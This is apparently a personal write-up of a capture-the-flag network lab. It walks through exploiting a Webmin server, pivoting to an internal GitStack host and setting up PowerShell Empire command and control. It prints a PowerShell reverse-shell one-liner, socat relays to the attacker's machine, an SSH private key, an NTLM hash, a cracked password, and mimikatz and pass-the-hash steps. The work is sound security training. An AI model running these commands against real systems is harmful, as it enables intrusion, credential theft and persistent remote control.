Thomas has sent over the following information about the network:

---

_There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.  


---

From this we can take away the following pieces of information:

- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it  
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour  
- The (assumed) Windows PC cannot be accessed directly from the webserver

---

There are five possible ways to enumerate a network through a compromised host:

1. Using material found on the machine. The hosts file or ARP cache, for example  
2. Using pre-installed tools  
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy

---

_The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (_`.so` _files on Linux, or_ `.dll` _files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run._

---

_**Conduct:**_  
As this network is shared amongst a number of people, it goes without saying: please don't mess things up for others in the network. There are no password changes required in any of these tasks, and no files need deleted. At various stages in this network it will be necessary to upload files and tools to the remote box. Please upload these in the format: `toolname-username` (e.g. `socat-MuirlandOracle`, `shell-MuirlandOracle.aspx`, etc) to avoid overwriting work belonging to anyone else. In short, don't be a troll, be respectful, and have fun!

For tunnelling: **Use ports above 15000**

---

# Initial entry

I'm given an exploit `CVE-2019-15107` an instructed to use it against the public facing web-server: https://github.com/MuirlandOracle/CVE-2019-15107

This gives me initial access to the network.

Firstly though i perform an nmap scan:

```php
# Nmap 7.94SVN scan initiated Fri Jul 19 04:18:22 2024 as: nmap -sC -sV -p 22,80,443,9090,10000 -oN nmap/initial-15000-versions.txt 10.200.57.200
Nmap scan report for 10.200.57.200
Host is up (0.019s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-07-19T03:08:29
|_Not valid after:  2025-07-19T03:08:29
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 19 04:19:06 2024 -- 1 IP address (1 host up) scanned in 43.83 seconds
```

`MiniServ 1.890 (Webmin httpd)` is vulnerable to the exploit provided. This is the service i will attack with exploit `CVE-2019-15107`.

```php
./CVE-2019-15107.py 10.200.57.200 -p 10000
```

This gives me a pseudo shell which the exploit then can leverage into a full reverse shell, or i can use my own reverse shell, as described in the briefing.

![[Pasted image 20240720040437.png]]

![[Pasted image 20240720040511.png]]

1. When i get the upgraded shell i firstly stablize it so it's easier to work with

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. **CTL+Z**

3. Tell your machine to push the special characters straight to the target so we can use auto-complete etc.

```php
stty raw -echo && fg
```

4. Finally

```php
export TERM=xterm-256-color
```

Now we have a shell we can work with to explore the rest of the network. 

---
# Enumeration after entry

I check `/etc/hosts` file but nothing of value is inside:

![[Pasted image 20240720041610.png]]

I had problems opening nano so i switched the terminal to standard xterm:

```php
export TERM=xterm
```

- Look up shell stablizing i may be doing something wrong somewhere

- I check the arp table:

```php
[root@prod-serv .Platos]# arp -a                     
ip-10-200-57-1.eu-west-1.compute.internal (10.200.57.1) at 02:ea:52:70:cc:4d [ether] on eth0
```

- Further enumeration

```php
[root@prod-serv .Platos]# cat /root/.ssh/known_hosts 
10.50.73.2 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIS6L+Ax8C4H3PMtKY7PCcN4u95yH7JE+Y/Zk31JOtSJup9dDfMVG2SwTN5mD5T7bS1d3oNqVqq+NZJT/IP85ko=
```

```php
[root@prod-serv .Platos]# cat /root/.ssh/id_rsa      
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- Looking at my notes i spot two commands:

1. Linux:

```php
nmcli dev show
```

2. Windows

```php
ipconfig /all
```

Terminal is very annoying so this may not be 100% accurate `nmcli dev show`:

```php
GENERAL.TYPE:                           ethernet
GENERAL.HWADDR:                         02:88:73:F8:22:F1
GENERAL.MTU:                            9001
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     eth0
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveCo
nnection/1
WIRED-PROPERTIES.CARRIER:               on
IP4.ADDRESS[1]:                         10.200.57.200/24
IP4.GATEWAY:                            10.200.57.1
IP4.ROUTE[1]:                           dst = 0.0.0.0/0, nh = 10.200.57.1, mt = 
100
IP4.ROUTE[2]:                           dst = 10.200.57.0/24, nh = 0.0.0.0, mt =
 100
IP4.DNS[1]:                             10.200.0.2
IP4.DOMAIN[1]:                          eu-west-1.compute.internal
IP6.ADDRESS[1]:                         fe80::88:73ff:fef8:22f1/64
IP6.GATEWAY:                            --
IP6.ROUTE[1]:                           dst = ff00::/8, nh = ::, mt = 256, table
=255
IP6.ROUTE[2]:                           dst = fe80::/64, nh = ::, mt = 256

: ESCESC[[GENERAL.DEVICE:                         eth0
GENERAL.TYPE:                           ethernet
GENERAL.HWADDR:                         02:88:73:F8:22:F1
GENERAL.MTU:                            9001
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     eth0
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveCo
nnection/1
WIRED-PROPERTIES.CARRIER:               on
IP4.ADDRESS[1]:                         10.200.57.200/24
IP4.GATEWAY:                            10.200.57.1
IP4.ROUTE[1]:                           dst = 0.0.0.0/0, nh = 10.200.57.1, mt = 
100
IP4.ROUTE[2]:                           dst = 10.200.57.0/24, nh = 0.0.0.0, mt =
 100
IP4.DNS[1]:                             10.200.0.2
IP4.DOMAIN[1]:                          eu-west-1.compute.internal
IP6.ADDRESS[1]:                         fe80::88:73ff:fef8:22f1/64
IP6.GATEWAY:                            --
IP6.ROUTE[1]:                           dst = ff00::/8, nh = ::, mt = 256, table
=255
IP6.ROUTE[2]:                           dst = fe80::/64, nh = ::, mt = 256

:: ESCESC[[GENERAL.DEVICE:                         eth0
GENERAL.TYPE:                           ethernet
GENERAL.HWADDR:                         02:88:73:F8:22:F1
GENERAL.MTU:                            9001
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     eth0
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveCo
nnection/1
WIRED-PROPERTIES.CARRIER:               on
IP4.ADDRESS[1]:                         10.200.57.200/24
IP4.GATEWAY:                            10.200.57.1
IP4.ROUTE[1]:                           dst = 0.0.0.0/0, nh = 10.200.57.1, mt = 
100
IP4.ROUTE[2]:                           dst = 10.200.57.0/24, nh = 0.0.0.0, mt =
 100
IP4.DNS[1]:                             10.200.0.2
IP4.DOMAIN[1]:                          eu-west-1.compute.internal
IP6.ADDRESS[1]:                         fe80::88:73ff:fef8:22f1/64
IP6.GATEWAY:                            --
IP6.ROUTE[1]:                           dst = ff00::/8, nh = ::, mt = 256, table
=255
IP6.ROUTE[2]:                           dst = fe80::/64, nh = ::, mt = 256
```

**`10.200.57.0/24`**

I may as well try the bash port scanner from earlier:

```bash
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

**I decide to verify the id_rsa works and login via ssh, maybe i will get a better shell**

```php
[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.57.${i} | grep "bytes from" &); done
64 bytes from 10.200.57.1: icmp_seq=1 ttl=255 time=0.351 ms
64 bytes from 10.200.57.200: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 10.200.57.250: icmp_seq=1 ttl=64 time=1.61 ms
```

_**Note:** The host ending in_ `.250` _is the OpenVPN server, and should be excluded from all answers._

Binaries: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64

**Preparing to scan the Network**
1. I download a binary copy of nmap and rename it with the provided naming scheme:

```python
wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/nmap/build.sh
```

```php
mv build.sh nmap-<USERNAME>.sh
```

2. Setup a http server for transfer

```php
python -m SimpleHTTPServer 80
```

3. Get file

```php
wget <IP>/<FILE>
```

- In this case i think we are meant to use curl

```php
curl <IP>/<FILE> -o <TOOLNAME>-<Username>
```

- I think this pulls in the file with the correct name but rename it if it doesn't.

Scanning

```php
./nmap-<USERNAME> -sn <IP>-255 -oN scan-<USERNAME>
```

- Here the `-sn` switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.
- Determine ip range with `ip a`

_I was having trouble because i wasn't using the correct files_

1. Updated link to binaries on github

- Lets try re-uploading the tool.

And we get the nmap results back:

```php
[root@prod-serv tmp]# cat scan-Platos.txt 
# Nmap 6.49BETA1 scan initiated Sat Jul 20 05:52:35 2024 as: ./nmap-Platos -sn -oN scan-Platos.txt 10.200.57.1-255
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-57-1.eu-west-1.compute.internal (10.200.57.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00051s latency).
MAC Address: 02:EA:52:70:CC:4D (Unknown)
Nmap scan report for ip-10-200-57-100.eu-west-1.compute.internal (10.200.57.100)
Host is up (0.00032s latency).
MAC Address: 02:F0:DE:E0:9E:91 (Unknown)
Nmap scan report for ip-10-200-57-150.eu-west-1.compute.internal (10.200.57.150)
Host is up (-0.10s latency).
MAC Address: 02:7A:BF:33:C3:ED (Unknown)
Nmap scan report for ip-10-200-57-250.eu-west-1.compute.internal (10.200.57.250)
Host is up (0.00039s latency).
MAC Address: 02:F6:29:E5:D8:83 (Unknown)
Nmap scan report for ip-10-200-57-200.eu-west-1.compute.internal (10.200.57.200)
Host is up.
# Nmap done at Sat Jul 20 05:52:39 2024 -- 255 IP addresses (5 hosts up) scanned in 3.74 seconds
```

I found the other two machines with the following ip addresses:
- 10.200.57.100
- 10.200.57.150

Now i can run a scan on them both individually to see what is running. I know that i should be able to connect to at lest one of them from the task description earlier.

```php
./nmap-Platos 10.200.57.100
```

```php
./nmap-Platos 10.200.57.150
```

Results:

```php
All 6150 scanned ports on ip-10-200-57-100.eu-west-1.compute.internal (10.200.57.100) are filtered
```

```php
Nmap scan report for ip-10-200-57-150.eu-west-1.compute.internal (10.200.57.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00075s latency).
Not shown: 6147 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:7A:BF:33:C3:ED (Unknown)
```

---
# Pivoting

```php
sshuttle -r username@address subnet
```

```php
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
```

```php
sudo sshuttle -r root@10.200.57.200 --ssh-cmd "ssh -i id_rsa" -N -x 10.200.57.200
```

I now get access to the webpage at `.150`:

![[Pasted image 20240720063657.png]]

This brings me to a login page with default username and passwords exposed:

![[Pasted image 20240720063909.png]]

I try the pass but it fails. Maybe i can do something with burp:

![[Pasted image 20240720064017.png]]

Searchsploit:

![[Pasted image 20240720064120.png]]

I examine the script:

```php
searchsploit -x 43777 
```

- And then transfer it to my working directory.

```php
searchsploit -m 43777
```

Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:  
`dos2unix ./EDBID.py`

This  can also be done manually with `sed` if `dos2unix` is unavailable:  

```php
sed -i 's/\r//' ./EDBID.py
```

The script is written in python 2 so i add the correct shebang line to the top of the exploit:
`#!/usr/bin/python2`

**Details:**
_Set the IP to the correct target for your choice of pivoting technique. If you used sshuttle or one of the proxying techniques then this will just be the IP of the target. If you used a port forward then it will be `localhost:chosen_port`, e.g.:  
`localhost:8000`_

- I updated the script so that the files it creates have the provided naming convention.
- It can now be executed with `./`

![[Pasted image 20240721053404.png]]

Now if everything worked we should be able to use that information in burpsuite repeater and gain a reverse shell.

![[Pasted image 20240720083047.png]]

- Change `GET` request to `POST`
- Add `Content-Type` header
- Add in the command executed with a as the parameter

```php
Content-Type: application/x-www-form-urlencoded
```

- At some point we will need to URL encode the exploit for them to work

![[Pasted image 20240721054802.png]]

I have command execution.

![[Pasted image 20240721055045.png]]

I'm now going to check if it has access to the outside network by trying to get it to ping my attacker machine:

- Start up a TCPDump listener on kali

```php
sudo tcpdump -i tun0 icmp
```

- Now in burp we can issue the command:

```php
ping -n 3 ATTACKING_IP
```

![[Pasted image 20240721055757.png]]

_Don't forget to URL encode if you have issues with burp_

![[Pasted image 20240721055911.png]]

I have two easy options here:

- Given I have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
- We could set up a relay on .200 to forward a shell back to a listener

***Ensure that any ports you open are above 15000***

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:  
`firewall-cmd --zone=public --add-port PORT/tcp`

```php
firewall-cmd --zone=public --add-port 22888/tcp
```

![[Pasted image 20240721061859.png]]

- In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).  

- With that done, set up either a listener or a relay on .200.

We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Payload:
```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.57.200',22888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Setting up SOCAT

**Transfer SOCAT onto the webserver to setup the relay.**

- Determine architecture so i can send the correct binary

```php
[root@prod-serv tmp]# uname -a
Linux prod-serv 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Binary folder locaton:
1. `/opt/static-binaries/`
2. `/usr/share/windows-binaries`

**For example, with a Python webserver:**

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`

Then, on the target:  
`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

```php
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

**On the Webserver:**

**SOCAT Reverse Shell Relay**

In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). 
1. First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). 
2. Next, on the compromised server, use the following command to start the relay:  
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`

```php
./socat tcp-l:22888 tcp:ATTACKING_IP:22888 &
```

_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._

A brief explanation of the above command:

- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.

_I tried using the provided ports but it failed. After using the port i opened earlier for both entries (22888), i get the relayed shell_

![[Pasted image 20240721072239.png]]

![[Pasted image 20240721072342.png]]

Just the personal computer, `.100` left.

---

# Setting up a user/admin account

First we create the account itself:  

```php
net user USERNAME PASSWORD /add
``` 

**_Account:_**
Username:
Platos

Password:
PlatosTHM13!3

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  

```php
net localgroup Administrators USERNAME /add   
```

```php
net localgroup "Remote Management Users" USERNAME /add
```

![[Pasted image 20240721073424.png]]

With evil-winrm installed, we can connect to the target with the syntax shown here:  
`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`

```php
evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
```

_If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -_`i 127.0.0.1 -P 58950`_)._

```php
evil-winrm -u Platos -p 'PlatosTHM13!3' -i 10.200.57.150
```

![[Pasted image 20240721074043.png]]

- I'm not going to use `xfreerdp` because i've used it before so i would rather try out evil-win which i've never used. 

- Looking at the documents i can easily upload files with the following:

```php
upload local_filename destination_filename
```

So i'll upload mimikatz with evil-winrm.

- I was having trouble with file paths so i just moved into the mimikatz dir and it uploaded.

![[Pasted image 20240721080138.png]]

- I'll try connecting with freerdp and using mimikatz because it wont run from evil-winrm, or i'm using it wrong

```php
xfreerdp /v:<IP>/u:<USER> /p:'password123!'
```

```php
xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard
```

- This method worked first time, so maybe you're just meant to use evil-win as a transfer tool in this step, but maybe it can be used and i just wasn't doing it correctly.

![[Pasted image 20240721082043.png]]

Now to dump the sam, but first:
- `privilege::debug`   
- `token::elevate`
- Finally ``lsadump::sam``

```php
mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
```

Okay, this didn't work so lets try sharing the resource this time with freerdp:

_I re-ran it but with powershell in administrator mode and the privilege command worked this time, so this next part may not be necessary._ 

![[Pasted image 20240721083505.png]]

---

```php
xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard /drive:/usr/share/windows-resources,share
```

1. With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. 

2. Next we open up a `cmd.exe` or `PowerShell` window _as an administrator_ (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:  

`\\tsclient\share\mimikatz\x64\mimikatz.exe`

```php
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

**Not required, see above**

--- 

**We have the SAM Passwords!**

I enter Thomas's password into crackstation:

![[Pasted image 20240721083948.png]]

**Username:**
Thomas

**Password:**
i<3ruby

---

In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

To do this we use the `-H` switch _instead of_ the `-p` switch we used before.

For example:  
`evil-winrm -u Administrator -H ADMIN_HASH -i IP'

```php
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150
```

That sets me up for the next section `Command and Control`

**Completed:** _08:45 2024-07-21_

---

# Command and Control

Install Empire & Starkiller:

```php
sudo apt install powershell-empire starkiller
```

With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:  

```php
sudo powershell-empire server
```

Starting the Empire CLI Client is as easy as:  

```php
sudo powershell-empire client
```

![[Pasted image 20240721090302.png]]

_With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`._

**StarKiller**

With Empire server running:

```php
starkiller
```

**Username:** `empireadmin`

**Password:** `password123`

**URL:** `https://localhost:1337`

---

**Setup a listener**

![[Pasted image 20240721091610.png]]

![[Pasted image 20240721091706.png]]

**Stagers**

![[Pasted image 20240721092120.png]]

- Submit
- This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard"
- Now i can execute it on the target





